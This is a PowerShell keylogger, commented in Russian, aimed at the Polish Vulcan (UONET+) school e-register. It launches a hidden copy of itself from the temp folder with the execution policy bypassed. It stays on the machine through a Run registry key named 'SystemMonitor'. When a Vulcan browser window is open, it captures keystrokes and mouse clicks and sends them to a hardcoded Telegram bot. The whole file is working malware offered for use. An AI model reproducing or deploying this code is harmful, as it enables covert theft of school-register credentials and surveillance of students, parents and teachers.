# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ВУЛКАН С АКТИВАЦИЕЙ ПО САЙТАМ
$keyloggerStatus = "Starting enhanced Vulcan monitor..."

# Создаем улучшенный кейлоггер с активацией по сайтам
$keyloggerScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Runtime.InteropServices

# Целевые сайты Вулкан для активации
`$vulcanActivationUrls = @(
    "*uonetplus.vulcan.net.pl/minrol*",
    "*uonetplus.vulcan.net.pl/rybnik*", 
    "*uonetplus.vulcan.net.pl/*",
    "*vulcan*",
    "*uonetplus*",
    "*dziennik*"
)

`$global:isMonitoringActive = `$false
`$global:activationTime = `$null
`$global:keyBuffer = ""
`$global:mouseBuffer = ""
`$global:lastActivity = Get-Date
`$global:sessionData = @()
`$global:browserWindow = ""

function Send-ToTelegram {
    param(`$message)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$message
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body -TimeoutSec 3
    } catch { 
        # Ignore telegram errors
    }
}

function Start-MonitoringSession {
    `$global:isMonitoringActive = `$true
    `$global:activationTime = Get-Date
    `$global:keyBuffer = ""
    `$global:mouseBuffer = ""
    `$global:sessionData = @()
    `$global:lastActivity = Get-Date
    
    Send-ToTelegram "🎯 VULCAN MONITORING ACTIVATED!`nUser started session on: `$(`$global:browserWindow)`nMonitoring period: 2 minutes`nStarted: `$(`$global:activationTime.ToString('HH:mm:ss'))"
}

function Stop-MonitoringSession {
    if(`$global:isMonitoringActive) {
        `$global:isMonitoringActive = `$false
        `$sessionDuration = (Get-Date) - `$global:activationTime
        
        # Отправляем финальный отчет
        `$finalReport = "📊 VULCAN SESSION COMPLETE`n"
        `$finalReport += "Duration: `$([math]::Round(`$sessionDuration.TotalMinutes, 1)) minutes`n"
        `$finalReport += "Total keystrokes captured: `$(`$global:sessionData.Count)`n"
        `$finalReport += "Browser window: `$(`$global:browserWindow)`n"
        `$finalReport += "Session ended: `$((Get-Date).ToString('HH:mm:ss'))"
        
        Send-ToTelegram `$finalReport
        
        # Очищаем буферы
        `$global:keyBuffer = ""
        `$global:mouseBuffer = ""
        `$global:sessionData = @()
    }
}

function Process-KeyBuffer {
    if(`$global:keyBuffer -ne "" -and `$global:keyBuffer.Length -gt 0) {
        Send-ToTelegram "⌨️ KEYSTROKES [Vulcan]: `$(`$global:keyBuffer)"
        `$global:sessionData += "KEYS: `$(`$global:keyBuffer)"
        `$global:keyBuffer = ""
    }
}

function Process-MouseBuffer {
    if(`$global:mouseBuffer -ne "" -and `$global:mouseBuffer.Length -gt 0) {
        Send-ToTelegram "🖱️ MOUSE ACTIONS [Vulcan]: `$(`$global:mouseBuffer)"
        `$global:sessionData += "MOUSE: `$(`$global:mouseBuffer)"
        `$global:mouseBuffer = ""
    }
}

function Check-VulcanSite {
    try {
        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0}
        
        foreach(`$process in `$processes) {
            `$windowTitle = `$process.MainWindowTitle
            if(`$windowTitle) {
                foreach(`$url in `$vulcanActivationUrls) {
                    if(`$windowTitle -like `$url) {
                        `$global:browserWindow = `$windowTitle
                        return `$true
                    }
                }
                
                # Также проверяем по процессу браузера
                `$browserProcesses = @("chrome", "msedge", "firefox", "opera", "iexplore")
                if(`$browserProcesses -contains `$process.ProcessName.ToLower()) {
                    if(`$windowTitle -match "vulcan|uonetplus|dziennik") {
                        `$global:browserWindow = `$windowTitle
                        return `$true
                    }
                }
            }
        }
        return `$false
    } catch {
        return `$false
    }
}

# Основной цикл мониторинга
while(`$true) {
    try {
        # Проверяем, находится ли пользователь на сайте Вулкан
        `$isOnVulcanSite = Check-VulcanSite
        
        if(`$isOnVulcanSite -and !`$global:isMonitoringActive) {
            # Активируем мониторинг при первом обнаружении сайта
            Start-MonitoringSession
        }
        
        if(`$isOnVulcanSite -and `$global:isMonitoringActive) {
            # Проверяем, не истекло ли время мониторинга (2 минуты)
            `$monitoringDuration = (Get-Date) - `$global:activationTime
            if(`$monitoringDuration.TotalMinutes -ge 2) {
                Stop-MonitoringSession
                continue
            }
            
            # Обновляем время последней активности
            `$global:lastActivity = Get-Date
            
            # Мониторинг клавиатуры - ЗАПИСЫВАЕМ ВСЕ КЛАВИШИ
            for(`$i = 8; `$i -le 255; `$i++) {
                `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
                
                if(`$keyState -eq -32767) {
                    `$key = [System.Windows.Forms.Keys]`$i
                    
                    # Обработка специальных клавиш
                    switch(`$key) {
                        "Enter" { 
                            `$global:keyBuffer += "[ENTER]"
                            Process-KeyBuffer
                        }
                        "Space" { 
                            `$global:keyBuffer += " " 
                        }
                        "Back" { 
                            `$global:keyBuffer += "[BACKSPACE]" 
                        }
                        "Tab" { 
                            `$global:keyBuffer += "[TAB]" 
                        }
                        "Escape" {
                            `$global:keyBuffer += "[ESC]" 
                        }
                        "Delete" {
                            `$global:keyBuffer += "[DEL]" 
                        }
                        "ControlKey" {
                            `$global:keyBuffer += "[CTRL]" 
                        }
                        "ShiftKey" {
                            `$global:keyBuffer += "[SHIFT]" 
                        }
                        "Menu" {
                            `$global:keyBuffer += "[ALT]" 
                        }
                        "Capital" {
                            `$global:keyBuffer += "[CAPSLOCK]" 
                        }
                        "LWin" {
                            `$global:keyBuffer += "[WIN]" 
                        }
                        "Right" {
                            `$global:keyBuffer += "[RIGHT]" 
                        }
                        "Left" {
                            `$global:keyBuffer += "[LEFT]" 
                        }
                        "Up" {
                            `$global:keyBuffer += "[UP]" 
                        }
                        "Down" {
                            `$global:keyBuffer += "[DOWN]" 
                        }
                        "LButton" {
                            # ЛЕВАЯ КНОПКА МЫШИ
                            `$global:mouseBuffer += "[LEFT_CLICK]"
                            Process-MouseBuffer
                        }
                        "RButton" {
                            # ПРАВАЯ КНОПКА МЫШИ  
                            `$global:mouseBuffer += "[RIGHT_CLICK]"
                            Process-MouseBuffer
                        }
                        "MButton" {
                            # СРЕДНЯЯ КНОПКА МЫШИ
                            `$global:mouseBuffer += "[MIDDLE_CLICK]"
                            Process-MouseBuffer
                        }
                        default {
                            # ОБРАБОТКА ОБЫЧНЫХ СИМВОЛОВ
                            if(`$key -ge 65 -and `$key -le 90) {
                                # Буквы A-Z
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                `$isCaps = [System.Windows.Forms.Console]::CapsLock
                                
                                if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                                    `$global:keyBuffer += `$key.ToString()
                                } else {
                                    `$global:keyBuffer += `$key.ToString().ToLower()
                                }
                            } 
                            elseif(`$key -ge 48 -and `$key -le 57) {
                                # Цифры 0-9 (верхний ряд)
                                `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                                `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                                if(`$isShift) {
                                    `$global:keyBuffer += `$symbols[`$key - 48]
                                } else {
                                    `$global:keyBuffer += (`$key - 48).ToString()
                                }
                            }
                            elseif(`$key -ge 96 -and `$key -le 105) {
                                # Цифры на NumPad
                                `$global:keyBuffer += (`$key - 96).ToString()
                            }
                            else {
                                # Специальные символы
                                switch(`$key) {
                                    186 { `$global:keyBuffer += ";" }  # Точка с запятой
                                    187 { `$global:keyBuffer += "=" }  # Равно
                                    188 { `$global:keyBuffer += "," }  # Запятая  
                                    189 { `$global:keyBuffer += "-" }  # Минус
                                    190 { `$global:keyBuffer += "." }  # Точка
                                    191 { `$global:keyBuffer += "/" }  # Слеш
                                    192 { `$global:keyBuffer += "`"" }  # Кавычка
                                    219 { `$global:keyBuffer += "[" }  # Квадратная скобка [
                                    220 { `$global:keyBuffer += "\" }  # Обратный слеш
                                    221 { `$global:keyBuffer += "]" }  # Квадратная скобка ]
                                    222 { `$global:keyBuffer += "'" }  # Апостроф
                                }
                            }
                        }
                    }
                    
                    # Автоматически отправляем буфер если он становится слишком большим
                    if(`$global:keyBuffer.Length -ge 100) {
                        Process-KeyBuffer
                    }
                    
                    # Отправляем буфер если прошло больше 3 секунд с последней отправки
                    `$timeSinceLastSend = (Get-Date) - `$global:lastActivity
                    if(`$timeSinceLastSend.TotalSeconds -ge 3 -and `$global:keyBuffer.Length -gt 0) {
                        Process-KeyBuffer
                        `$global:lastActivity = Get-Date
                    }
                }
            }
        }
        elseif(!`$isOnVulcanSite -and `$global:isMonitoringActive) {
            # Пользователь ушел с сайта Вулкан - завершаем сессию
            Stop-MonitoringSession
        }
        
        Start-Sleep -Milliseconds 10
        
    } catch {
        # Игнорируем ошибки для стабильности работы
    }
}
"@

# Сохраняем и запускаем улучшенный кейлоггер
try {
    $keyloggerScript | Out-File "$env:TEMP\vulcan_enhanced.ps1" -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_enhanced.ps1`"" -WindowStyle Hidden
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_enhanced.ps1`""
    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "✅ Enhanced Vulcan monitor active - will activate on target sites for 2 minutes"
} catch {
    $keyloggerStatus = "❌ Enhanced monitor failed: $($_.Exception.Message)"
}
